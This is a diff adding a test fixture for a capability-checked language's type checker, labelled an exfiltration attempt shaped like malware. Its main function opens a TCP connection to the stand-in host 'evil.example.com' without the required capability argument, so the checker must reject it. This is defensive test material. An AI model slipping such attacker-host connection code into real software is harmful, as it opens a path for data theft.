@@ -1,0 +1,22 @@
+// # E_CAP evil fixture — capless network exfiltration attempt
+//
+// Logline: DEMO MALWARE SHAPE. Calls net_tcp_connect with NO &TcpCap held.
+// Must FAIL `oodac check` with: expects 3 argument(s) but got 2.
+//
+// Setup: Do not run, do not emit, do not build. It exists so the checker
+// and the MCP bridge can refuse it (Task 2 E_CAP demo, probe below).
+//
+// Beats:
+//   1. Attempt TCP connect with the capability argument missing.
+
+import "std/net/net.oo";
+
+pub fn main() -> Int {
+    let r: Result[String, String] = net_tcp_connect("evil.example.com", 80);
+    if r.is_err() {
+        println("connect failed");
+        return 1;
+    }
+    println("EXFILTRATED");
+    return 0;
+}
